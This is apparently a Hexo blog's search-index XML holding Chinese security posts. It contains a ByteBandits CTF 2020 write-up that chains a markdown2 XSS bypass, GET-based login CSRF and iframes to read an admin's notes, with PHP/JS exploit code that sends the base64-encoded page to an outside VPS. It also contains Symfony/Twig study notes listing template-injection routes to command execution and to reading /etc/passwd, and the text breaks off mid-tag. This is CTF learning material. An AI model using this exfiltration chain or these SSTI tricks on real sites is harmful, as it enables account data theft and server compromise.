<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ByteBandits CTF 2020部分writeup-notesapp</title>
      <link href="/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/"/>
      <url>/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃了不会前端的大亏，下午的时候一度要做出来了，思路完全对了</p><p>编写利用过程失败了，最后就差<code>js</code>获取<code>iframe</code>内容那么一点卡住了很久，最后改了几个字符就成功了</p><p>网上一搜一页基本上都是复制粘帖的，果然不能总靠临时学习，吐了</p><p>这次比赛过后下定决心好好学一下<code>js</code></p><h2 id="源代码和大概内容"><a href="#源代码和大概内容" class="headerlink" title="源代码和大概内容"></a>源代码和大概内容</h2><p><strong>main.py</strong></p><pre><code>import osfrom flask import Flask, render_template, request, flash, redirectfrom flask_sqlalchemy import SQLAlchemyfrom flask_login import LoginManagerfrom flask_login import login_required, logout_user, current_user, login_userimport markdown2import requestsfrom .models import Userfrom . import db, create_app, login_managerfrom .visit_link import q, visit_urlapp = create_app()# configure login_manager {{{1 #@login_manager.user_loaderdef load_user(user_id):    """Check if user is logged-in on every page load."""    if user_id is not None:        return User.query.get(user_id)    return None@login_manager.unauthorized_handlerdef unauthorized():    """Redirect unauthorized users to Login page."""    flash('You must be logged in to view that page.')    return redirect("/login")# 1}}} ## configure routes {{{1 #@app.route("/")def index():    if current_user.is_authenticated:        return redirect("/profile")    return render_template("index.html")@app.route("/register", methods = ["GET", "POST"])def register():    if current_user.is_authenticated:        return redirect("/profile")    if request.method == 'POST':        # register user        id = request.form.get('username')        password = request.form.get('password')        existing_user = User.query.filter_by(id = id).first()  # Check if user exists        if existing_user is None:            user = User(id = id)            user.set_password(password)            user.notes = ""            db.session.add(user)            db.session.commit()  # Create new user            login_user(user)  # Log in as newly created user            return redirect("/profile")        flash('A user already exists with that name already exists.')        return redirect("/register")    return render_template("register.html")@app.route("/login", methods = ["GET", "POST"])def login():    if current_user.is_authenticated:        return redirect("/profile")    if request.args.get("username"):        # register user        id = request.args.get('username')        password = request.args.get('password')        user = User.query.filter_by(id = id).first()        if user and user.check_password(password = password):            login_user(user)            return redirect("/profile")        flash('Incorrect creds')        return redirect("/login")    return render_template("login.html")@app.route("/visit_link", methods=["GET", "POST"])def visit_link():    if request.method == "POST":        url = request.form.get("url")        token = request.form.get("g-recaptcha-response")        r = requests.post("https://www.google.com/recaptcha/api/siteverify", data = {            'secret': os.environ.get('RECAPTCHA_SECRET'),            'response': token        })        if r.json()['success']:            job = q.enqueue(visit_url, url, result_ttl = 600)            flash("Our admin will visit the url soon.")            return render_template("visit_link.html", job_id = job.id)        else:            flash("Recaptcha verification failed")    return render_template("visit_link.html")@app.route("/status")def status():    job_id = request.args.get('job_id')    job = q.fetch_job(job_id)    status = job.get_status()    return render_template("status.html", status = status)@app.route("/profile")@login_requireddef profile():    return render_template("profile.html", current_user = current_user)@app.route("/update_notes", methods=["POST"])@login_requireddef update_notes():    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)    db.session.commit()    return redirect("/profile")@app.route("/logout")@login_requireddef logout():    logout_user()    return redirect("/")# 1}}} #</code></pre><p>是一个<code>xss</code>挑战，提交<code>url</code>可以让<code>admin</code>去访问</p><p>而 <code>visit_link.py</code>的部分内容是这样</p><pre><code>async def main(url):    browser = await launch(headless=True,                           executablePath="/usr/bin/chromium-browser",                           args=['--no-sandbox', '--disable-gpu'])    page = await browser.newPage()    await page.goto("https://notes.web.byteband.it/login")    await page.type("input[name='username']", "admin")    await page.type("input[name='password']", os.environ.get("ADMIN_PASS"))    await asyncio.wait([        page.click('button'),        page.waitForNavigation(),    ])    await page.goto(url)    await browser.close()def visit_url(url):    asyncio.get_event_loop().run_until_complete(main(url))</code></pre><p>打开<code>chrome</code>浏览器然后登录<code>admin</code>后访问提交的页面</p><p>然后看到 <code>main.py</code></p><pre><code>@app.route("/update_notes", methods=["POST"])@login_requireddef update_notes():    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)    db.session.commit()    return redirect("/profile")</code></pre><p>授权登录后可以编辑<code>notes</code>,使用<code>markdown2</code></p><p>看到<code>github</code>上的<code>issues</code></p><p><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a></p><p>可以绕过造成 <code>xss</code></p><pre><code>&gt;&gt;&gt; import markdown2&gt;&gt;&gt; markdown2.markdown('&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;', safe_mode=True)'&lt;p&gt;&lt;http://g&lt;!s://q?&lt;!-&amp;lt;&lt;a href="http://g"&gt;&lt;script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&amp;lt;&lt;a href="http://g"&gt;a\\*/&lt;/script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;/p&gt;\n'&gt;&gt;&gt; </code></pre><p>所以这是个 <code>authenticated XSS</code>，需要登录才可以利用</p><p>在<code>login</code>内容</p><pre><code>@app.route("/login", methods = ["GET", "POST"])def login():    if current_user.is_authenticated:        return redirect("/profile")。。。。        id = request.args.get('username')        password = request.args.get('password')</code></pre><p>可以看到用的是 <code>request.args.get</code></p><p>也就是可以使用 <code>GET</code>来登录，</p><p>而<code>flag</code>在<code>admin_user.notes = os.environ.get("FLAG")</code></p><p>也就是<code>admin</code>页面的<code>notes</code>就是<code>flag</code>了</p><p>所以只要利用<code>xss</code>获取那个页面内容就可以了</p><p>至于<code>盗取cookie</code>的话，因为<code>cookie</code>使用了 <code>httponly</code></p><p>无法通过<code>js</code>来访问，加上这样的利用条件应该无法盗用了</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如果已经登录了，浏览器拥有那个<code>cookie</code>，然后有一个<code>iframe</code>，那么<code>iframe</code>可以获取那个<code>cookie</code></p><p><a href="https://www.chromium.org/updates/same-site" target="_blank" rel="noopener">chromium same-site update</a></p><p>所以变得明显起来了</p><p>构造一个页面，嵌入一个<code>iframe</code>是admin的<code>profile</code>内容，包含了<code>flag</code></p><p>然后加载完这个<code>iframe</code>后再构造<code>iframe</code>退出登录</p><p>然后构造<code>iframe</code>登录到自己的帐号，里面有<code>xss</code></p><p>有一点是因为自己构造的页面和题目页面是跨域的，在自己页面无法访问那个<code>admin profile</code></p><p>所以<code>xss</code>就有用场了，<code>xss</code>页面和<code>admin profile</code>的<code>iframe</code>是同源的,</p><p>那么<code>iframe</code>之间获取内容</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一个注意的点-输出-等待-输出的方式"><a href="#一个注意的点-输出-等待-输出的方式" class="headerlink" title="一个注意的点 输出-等待-输出的方式"></a>一个注意的点 输出-等待-输出的方式</h3><p>因为题目打开浏览器浏览打开访问页面后立刻关闭</p><pre><code>    await page.goto(url)    await browser.close()</code></pre><p>在短时间内，可能无法执行完成<code>js</code>脚本</p><p>所以缓冲区输出然后<code>sleep(10)</code> 停几秒，让浏览器没那么快加载完资源</p><p>就可以执行<code>js</code>脚本了</p><pre><code>&lt;?phpecho 123333;ob_flush();flush();?&gt;&lt;?phpsleep(10);?&gt;</code></pre><p>这样</p><p>在我的 <code>vps</code>上面写两个页面</p><p>一个<code>cli.php</code> ,一个<code>10.php</code></p><p><code>cli.php</code>是<code>update_notes</code> 更改我的<code>xss</code>内容</p><p>而 <code>10.php</code> 就是交给admin去访问的</p><p>一些无用的内容多了一点，懒得删除了，<code>cli.php</code>掉入坑里了，烦</p><h3 id="10-php"><a href="#10-php" class="headerlink" title="10.php"></a>10.php</h3><pre><code>&lt;?phpheader('access-control-allow-origin:*');?&gt;&lt;html&gt;&lt;/html&gt;&lt;script&gt;    i=document.createElement("iframe");    i.src="https://notes.web.byteband.it/profile";    i.id="pwn";    i.name="pwn";    var state = 0;    document.body.appendChild(i);    i.onload=function () {        j=document.createElement("iframe");        j.src="https://notes.web.byteband.it/logout";        j.id="pwn2";        document.body.appendChild(j);        j.onload=function () {            k=document.createElement("iframe");            k.src="https://notes.web.byteband.it/login?username=mo0n&amp;password=mo0n";            k.id="pwn3";            document.body.appendChild(k);            k.onload=function () {                l=document.createElement("iframe");                l.src="http://47.92.94.199/cli.php";                l.id="pwn4";                document.body.appendChild(l);                l.onload=function () {                    m=document.createElement("iframe");                    m.src="https://notes.web.byteband.it/profile";                    m.id="pwn5";                    document.body.appendChild(m);                    console.log(i)                }            }        }    }&lt;/script&gt;&lt;?phpecho 123333;ob_flush();flush();?&gt;&lt;?phpsleep(10);?&gt;</code></pre><h3 id="cli-php"><a href="#cli-php" class="headerlink" title="cli.php"></a>cli.php</h3><p>这个的<code>js</code>内容就是卡住的地方，如果会<code>javascript</code>的话早就做出来了，吐了</p><p>搜索网上内容</p><p>给出的<code>兄弟iframe通信</code>得到的是<code>window.parent.document.getElementById("pwn")</code></p><p>这样的，但是这个是不行的，</p><p>在本地测试是无法获取这个<code>admin 的iframe</code>，得到是<code>null</code></p><p>一度怀疑</p><h4 id="可行的一个是"><a href="#可行的一个是" class="headerlink" title="可行的一个是"></a>可行的一个是</h4><pre><code>top.pwn.document.body.innerHTML这个pwn是 i.name="pwn"</code></pre><h4 id="一个注意的点"><a href="#一个注意的点" class="headerlink" title="一个注意的点"></a>一个注意的点</h4><p>随后因为获取<code>html</code>内容带有<code>&lt;</code> 这些，<code>chromium</code>浏览器禁止跳转</p><p>所以只要把它们变成<code>base64</code>就可以了</p><pre><code>&lt;?phpfile_put_contents('flagggggggggggggggggg','yes');echo 123;$js='try{var x = window.parent.document.getElementById("pwn");console.log(x);var right = (x.contentWindow || x.contentDocument);if(right.document){right = right.document;window.location="http://47.92.94.199/flag.php?good="+right;}}catch{console.log(123333);}';$js='try{var x= window.parent.document.getElementById("pwn5");console.log(12);}catch(err){console.log("false")}';$js='x=top.pwn.document.body.innerHTML;console.log(x);window.location="http://47.92.94.199/flag.php?good="+btoa(x);';$content="&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;{$js}/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;";$url='https://notes.web.byteband.it/update_notes';echo "&lt;form style='display:none;' id='form1' name='form1' method='post' action='{$url}'&gt;&lt;input name='notes' type='text' value='{$content}' /&gt;&lt;/form&gt;&lt;script type='text/javascript'&gt;function load_submit(){document.form1.submit()}load_submit();&lt;/script&gt;";$a=1;ob_flush();flush();?&gt;&lt;?phpsleep(60);?&gt;</code></pre><p><code>vps</code>接收数据，</p><p>然后只要把空格转换成<code>+</code> 号就可以了</p><p>base64解码</p><pre><code>echo 'CgkJCjxkaXYgY2xhc3M9Imhlcm8gaXMtZnVsbGhlaWdodCBpcy1jZW50ZXJlZCBpcy12Y2VudGVyZWQgaXMtcHJpbWFyeSI+Cgk8ZGl2IGNsYXNzPSJoZXJvLWhlYWQiPgoJCTxuYXYgY2xhc3M9Im5hdmJhciI+CgkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItYnJhbmQiPgoJCQkJCTxhIGhyZWY9Ii8iIGNsYXNzPSJuYXZiYXItaXRlbSI+CgkJCQkJCU15Tm90ZXMKCQkJCQk8L2E+CgkJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9Im5hdmJhci1tZW51Ij4KCQkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItZW5kIj4KCQkJCQkJPHNwYW4gY2xhc3M9Im5hdmJhci1pdGVtIj4KCQkJCQkJCTxhIGhyZWY9Ii9sb2dvdXQiIGNsYXNzPSJidXR0b24gaXMtcHJpbWFyeSBpcy1pbnZlcnRlZCI+CgkJCQkJCQkJPHNwYW4+TG9nb3V0PC9zcGFuPgoJCQkJCQkJPC9hPgoJCQkJCQk8L3NwYW4+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9uYXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9Imhlcm8tYm9keSBjb2x1bW5zIGlzLWNlbnRlcmVkIGhhcy10ZXh0LWNlbnRlcmVkIj4KCQk8ZGl2IGNsYXNzPSJjb2x1bW4gaXMtNCI+CgkJCTxkaXYgY2xhc3M9InRpdGxlIj4KCQkJCUhvd2R5IGFkbWluIQoJCQk8L2Rpdj4KCQkJPCEtLSBzbyB0aGF0IHVzZXIgY2FuIHdyaXRlIGh0bWwgLS0+CgkJCTxwPglmbGFne2NoNDFuX3RIeV8zWHBsb2l0c190MF93MW59IDwvcD4KCQkJPGJyPgoJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iL3VwZGF0ZV9ub3RlcyI+CgkJCQk8dGV4dGFyZWEgY2xhc3M9InRleHRhcmVhIiBuYW1lPSJub3RlcyIgcGxhY2Vob2xkZXI9IldyaXRlIHNvbWV0aGluZyBoZXJlIj48L3RleHRhcmVhPgoJCQkJPGlucHV0IGNsYXNzPSJidXR0b24gaXMtZnVsbHdpZHRoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGRhdGUiIG5hbWU9IiI+CgkJCTwvZm9ybT4KCQk8L2Rpdj4KCTwvZGl2Pgo8L2Rpdj4KCgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogIDxkaXYgY2xhc3M9ImNvbnRlbnQgaGFzLXRleHQtY2VudGVyZWQiPgogICAgPHA+CiAgICAgIDxzdHJvbmc+TXlOb3Rlczwvc3Ryb25nPiBieSBuMG9iLgogICAgPC9wPgogIDwvZGl2Pgo8L2Zvb3Rlcj4KCg=='|base64 -d</code></pre><p>看到<code>&lt;p&gt;    flag{ch41n_tHy_3Xploits_t0_w1n} &lt;/p&gt;</code></p><p><strong>flag:</strong></p><p>flag{ch41n_tHy_3Xploits_t0_w1n}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘录</title>
      <link href="/2020/04/09/bei-wang/"/>
      <url>/2020/04/09/bei-wang/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="83ba5b7f637e193cf2ede398e771a21ce0126f879e6c75253f5dd162991fa1ed"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Symfony和模板注入的简单学习</title>
      <link href="/2020/04/01/symfony/"/>
      <url>/2020/04/01/symfony/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Symfony"><a href="#Symfony" class="headerlink" title="Symfony"></a>Symfony</h2><p>安装</p><pre><code>wget https://get.symfony.com/cli/installer bash installer</code></pre><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>使用<code>composer</code></p><pre><code>composer create-project symfony/website-skeleton projectname</code></pre><p>感觉还是直接<code>symfony</code>来的方便一点</p><pre><code>symfony new --full project</code></pre><h3 id="检查安全漏洞"><a href="#检查安全漏洞" class="headerlink" title="检查安全漏洞"></a>检查安全漏洞</h3><pre><code>symfony check:security</code></pre><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>好像有坑，需要非<code>root</code>用户运行，还有一系列权限</p><pre><code>symfony server:start</code></pre><h3 id="创建Controller"><a href="#创建Controller" class="headerlink" title="创建Controller"></a>创建Controller</h3><pre><code>php bin/console make:controller HomeController</code></pre><p>有一个注释路由</p><p>安装</p><pre><code>composer require annotations</code></pre><p>如果是用 <code>symfony new --full project</code>就已经安装了</p><p>用法：</p><pre><code>class MainController extends AbstractController{    /**     * @Route("/subscribe", name="subscribe")     */ public function subscribe(){}}</code></pre><h3 id="查看路由"><a href="#查看路由" class="headerlink" title="查看路由"></a>查看路由</h3><pre><code> php bin/console debug:router</code></pre><h2 id="symfony-App-全局变量"><a href="#symfony-App-全局变量" class="headerlink" title="symfony App 全局变量"></a>symfony App 全局变量</h2><p>app全局变量会自动注入全部<code>twig</code>模板</p><h3 id="app-user"><a href="#app-user" class="headerlink" title="app.user"></a>app.user</h3><p>当前用户的对象</p><h3 id="app-request"><a href="#app-request" class="headerlink" title="app.request"></a>app.request</h3><p>当前的请求数据</p><p>所有的方法直接去源代码看</p><p><a href="https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php" target="_blank" rel="noopener">https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php</a></p><p>列举几个常用的方法</p><ul><li>app.request.get(key)</li></ul><p>获取<code>post</code>的变量</p><ul><li>getSession</li></ul><p>获取session</p><pre><code>{{ app.request.getSession()|join('')}}</code></pre><ul><li>app.request.getUser()</li></ul><p>获取用户</p><ul><li>app.request.getPassword()</li></ul><p>获取<code>header</code>头<code>PHP_AUTH_PW</code>身份验证密码</p><h3 id="app-session"><a href="#app-session" class="headerlink" title="app.session"></a>app.session</h3><p>关于session </p><p>几个方法</p><ul><li>app.session.all</li></ul><p>获取全部</p><ul><li><p>app.session.get</p><pre><code>app.session.get('xxx')</code></pre></li><li><p>app.session.set</p></li></ul><p>设置session</p><pre><code>app.session.set('key','value')</code></pre><h3 id="app-environment"><a href="#app-environment" class="headerlink" title="app.environment"></a>app.environment</h3><p>配置环境</p><h3 id="app-debug"><a href="#app-debug" class="headerlink" title="app.debug"></a>app.debug</h3><p>如果开启了 debug，就是true</p><h3 id="app-token"><a href="#app-token" class="headerlink" title="app.token"></a>app.token</h3><p>暂时略</p><h2 id="关于-app-request-的进一步学习"><a href="#关于-app-request-的进一步学习" class="headerlink" title="关于 app.request 的进一步学习"></a>关于 app.request 的进一步学习</h2><p><strong>想到看这个还是因为打比赛后看writeup，一个师傅想到模板渲染用文件上传来写任意文件这样骚姿势</strong></p><p>于是就也想看看，感觉没啥新的发现，<code>wtcl</code></p><p>最简单的还是查看代码</p><p>在<code>vendor/symfony/http-foundation/Request.php</code></p><p><img src="../../../../../../../images/symfony/app-request.png" alt="pic"></p><p>一个一个跟进</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>是<code>POST</code>请求的内容</p><p>有</p><ul><li>all()</li><li>keys()</li><li>replace()</li><li>add()</li><li>get()</li><li>set()</li><li>has()</li><li>remove()</li><li>filter()</li></ul><h3 id="query-和request对应是GET"><a href="#query-和request对应是GET" class="headerlink" title="query 和request对应是GET"></a>query 和request对应是GET</h3><p>其中的方法和 <code>request</code>是一样的</p><pre><code>?a=11hh={{app.request.query.all()|join('')}}得到 1</code></pre><h3 id="attributes-和cookies方法都和这两个一样"><a href="#attributes-和cookies方法都和这两个一样" class="headerlink" title="attributes 和cookies方法都和这两个一样"></a>attributes 和cookies方法都和这两个一样</h3><ul><li><p>req.request.attributes</p></li><li><p>req.request.cookies</p></li></ul><h3 id="files"><a href="#files" class="headerlink" title="files"></a>files</h3><p><img src="../../../../../../../images/symfony/app-files.png" alt="pic"></p><p>可以看到 <code>FileBag extends ParameterBag</code></p><p>因此拥有上面一样的方法</p><p>同时上传的文件是<code>UploadedFile</code> 的实例</p><p>因此使用 <code>get</code>来获取上传的文件，可以使用<code>UploadFile</code>的方法</p><p>查看<code>UploadedFile.php</code> 的方法</p><p>没啥有用的感觉，应该就一个 <code>move</code> 可以任意文件上传吧</p><p><img src="../../../../../../../images/symfony/upload-move.png" alt="pic"></p><p>可以看到有两个参数，目录和名字</p><p>有写权限到任意位置</p><p>可以指定第二个参数为文件名，没有就是临时文件名</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>是环境变量的内容</p><p>看介绍：</p><p><strong>ServerBag is a container for HTTP headers from the $_SERVER variable.</strong></p><p>依然是 <code>extends ParameterBag</code></p><p>还是和上面类似，多了一个<code>getHeaders()</code></p><p>还是直接 <code>app.request.server.all()</code>简单粗暴</p><p>可以<code>set()</code>可以设置，但是没想到有什么用</p><h3 id="headers"><a href="#headers" class="headerlink" title="headers"></a>headers</h3><pre><code>app.request.headers </code></pre><p>这个看了下</p><h2 id="Twig-模板渲染简单学习"><a href="#Twig-模板渲染简单学习" class="headerlink" title="Twig 模板渲染简单学习"></a>Twig 模板渲染简单学习</h2><h3 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h3><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code>{% for i in 0..10%}1{%endfor%}</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code>{% if 1==1 %}1{%endif%}</code></pre><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><pre><code>{% include 'twigi/inc.twig' %}包含多个{% include ['1.html', '2.html'] %}</code></pre><p>如果有字数限制应该可以考虑<code>include</code></p><p>只能是 <code>templates</code>目录下的</p><h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>启动熟悉的<code>sandbox</code>模式</p><pre><code>{% sandbox %}{% include '1.html' %}{% endsandbox %}</code></pre><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><pre><code>{% set foo = 'bar' %}</code></pre><h3 id="filter-重要的来了"><a href="#filter-重要的来了" class="headerlink" title="filter 重要的来了"></a>filter 重要的来了</h3><h4 id="convert-encoding"><a href="#convert-encoding" class="headerlink" title="convert_encoding"></a>convert_encoding</h4><p>从编码字符串转换到另外一种编码</p><pre><code>{{ 'a<sddsa>'|convert_encoding('UTF-8', 'utf-16be') }}</sddsa></code></pre><h4 id="escape转义"><a href="#escape转义" class="headerlink" title="escape转义"></a>escape转义</h4><pre><code>{{'da"'|escape}}</code></pre><p>为了方便用<code>e</code>作为别名</p><p>可以<code>escape</code>多种格式</p><ul><li><p>html默认</p><pre><code>{{'da"'|e('html')}} da&amp;quot; </code></pre></li><li><p>js</p><pre><code>{{'da"'|e('js')}}da\u0022 </code></pre></li><li><p>css</p></li></ul><pre><code>{{'da"'|e('css')}}da\22 </code></pre><ul><li>url</li></ul><pre><code>{{'da"'|e('url')}}da%22 </code></pre><ul><li>还有个html_attr</li></ul><p>转义HTML属性字符串</p><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>选择元素</p><pre><code>{{[1,2,3,4,5,6,7]|filter(i=&gt;i&gt;2)|join('')}}3,4,5,6,7 </code></pre><p>这个也可以传入 <code>function</code> ，也是可以函数执行 getshell的</p><h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>返回第一个数组，<code>{}</code>,字符串 的内容</p><pre><code>{{ [1, 2, 3, 4]|first }} \\1{{ { a: 1, b: 2, c: 3, d: 4 }|first }} \\1{{ '1234'|first }} \\1</code></pre><h4 id="last-和first对应"><a href="#last-和first对应" class="headerlink" title="last 和first对应"></a>last 和first对应</h4><h4 id="format-占位符号"><a href="#format-占位符号" class="headerlink" title="format 占位符号"></a>format 占位符号</h4><pre><code>{{'南梦师傅 %s'|format('tql')}}南梦师傅 tql </code></pre><h4 id="join-拼接成字符串"><a href="#join-拼接成字符串" class="headerlink" title="join 拼接成字符串"></a>join 拼接成字符串</h4><pre><code>{{ [1, 2, 3]|join }}123</code></pre><h4 id="json-encode-就是使用这个函数"><a href="#json-encode-就是使用这个函数" class="headerlink" title="json_encode 就是使用这个函数"></a>json_encode 就是使用这个函数</h4><pre><code>{{ {a:1}|json_encode()}}{&amp;quot;a&amp;quot;:1}{{ 123|json_encode()}}123 </code></pre><h4 id="keys-获取数组的键名"><a href="#keys-获取数组的键名" class="headerlink" title="keys 获取数组的键名"></a>keys 获取数组的键名</h4><pre><code>{{ {a:1,b:2,c:3}|keys|join(',') }}a,b,c{{ [1,2,3,4]|keys|join(',') }}0,1,2,3</code></pre><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><pre><code>{{ 'das'|length}} //3</code></pre><h4 id="lower-和-upper"><a href="#lower-和-upper" class="headerlink" title="lower 和 upper"></a>lower 和 upper</h4><pre><code>{{ 'das'|lower}}{{ 'das'|upper}}</code></pre><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>就是数组内的映射的筛选</p><pre><code>{{[{a:1,b:2},{a:3,b:4}]|map(i=&gt; "#{i.a}")|join('') }}</code></pre><p>得到 <code>13</code></p><p><code>"{i.a}"</code> 这个引号需要是 双引号</p><p>更有用的一点是，允许用户传一个<code>function</code></p><p>可以是 <code>system</code> ，<code>passthru</code>，<code>exec</code> ,<code>popen</code>,</p><p><code>shell_exec</code> ，<code>file_put_contents</code>等等</p><p>那样就可以任意函数执行了</p><h4 id="merge-和php的一样"><a href="#merge-和php的一样" class="headerlink" title="merge 和php的一样"></a>merge 和php的一样</h4><p>数组合并</p><pre><code>{{ [1,2]|merge([3,4])|join(',')}}1,2,3,4</code></pre><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><pre><code>{{"abcdef "|replace({'a':'first','e':'haha'})}}firstbcdhahaf </code></pre><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><pre><code>{{"abcdef "|reverse}}fedcba </code></pre><h4 id="slice-切片"><a href="#slice-切片" class="headerlink" title="slice 切片"></a>slice 切片</h4><pre><code>{{'123'|slice(1,2)}} //23{{'123'[1:2]}} //23</code></pre><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><pre><code>{{ '1,2,3'|split(',') }}</code></pre><h4 id="striptags-去除标签"><a href="#striptags-去除标签" class="headerlink" title="striptags 去除标签"></a>striptags 去除标签</h4><pre><code>{{'<asd>asd'|striptags}} //asd</asd></code></pre><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>略</p><h4 id="url-encode"><a href="#url-encode" class="headerlink" title="url_encode"></a>url_encode</h4><pre><code>{{'<asd>asd'|url_encode}}%3Casd%3Easd </asd></code></pre><h3 id="function"><a href="#function" class="headerlink" title="function"></a>function</h3><h4 id="attribute-访问object方法"><a href="#attribute-访问object方法" class="headerlink" title="attribute 访问object方法"></a>attribute 访问object方法</h4><p><strong>还可以设置第三个参数，传递的变量</strong></p><p>可以访问 <code>object</code>的属性</p><p><strong>获取http请求</strong></p><pre><code>{{attribute(app,'request')}}</code></pre><p>获取<code>session</code></p><pre><code>{{ attribute(app,'session')|join('')}}</code></pre><p>当前程序环境的名称</p><pre><code>{{ attribute(app,'environment')}} //dev</code></pre><p>还有其他的方法，只是举个例子</p><h4 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include</h4><p>包含模板渲染的内容</p><p>可以传递变量</p><pre><code>{{ include('template.html', {foo: 'bar'}) }}</code></pre><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p>就是python那个</p><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>twig 读取模板的内容 限定在 templates</p><pre><code>{{ source('twigi/index.html.twig')}}</code></pre><h2 id="twig-和symfony"><a href="#twig-和symfony" class="headerlink" title="twig 和symfony"></a>twig 和symfony</h2><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><pre><code>第一个是路由，可以模板渲染{{ render('twig2hhh') }}{{ render('twig2hhh', options = []) }}</code></pre><h3 id="csrf-token-生成csrf-token"><a href="#csrf-token-生成csrf-token" class="headerlink" title="csrf_token 生成csrf token"></a>csrf_token 生成csrf token</h3><pre><code>{{csrf_token('asd')}}</code></pre><h3 id="humanize-人好看的形式"><a href="#humanize-人好看的形式" class="headerlink" title="humanize 人好看的形式"></a>humanize 人好看的形式</h3><pre><code>{{'adas'|humanize}} // Adas</code></pre><h3 id="file-excerpt-读取文件"><a href="#file-excerpt-读取文件" class="headerlink" title="file_excerpt 读取文件"></a>file_excerpt 读取文件</h3><pre><code>{{ '/etc/passwd'|file_excerpt(1, -1) }}</code></pre><p>第一个参数是<code>line</code></p><p>第二个参数是在给定行数周围显示多少行</p><p><code>-1</code>代表全部</p><h3 id="format-file"><a href="#format-file" class="headerlink" title="format_file"></a>format_file</h3><p>这个很迷似乎生成一个标签，然后点击就<code>can not open</code></p><p>懒得管了，占个位，用到再说</p><h3 id="file-link"><a href="#file-link" class="headerlink" 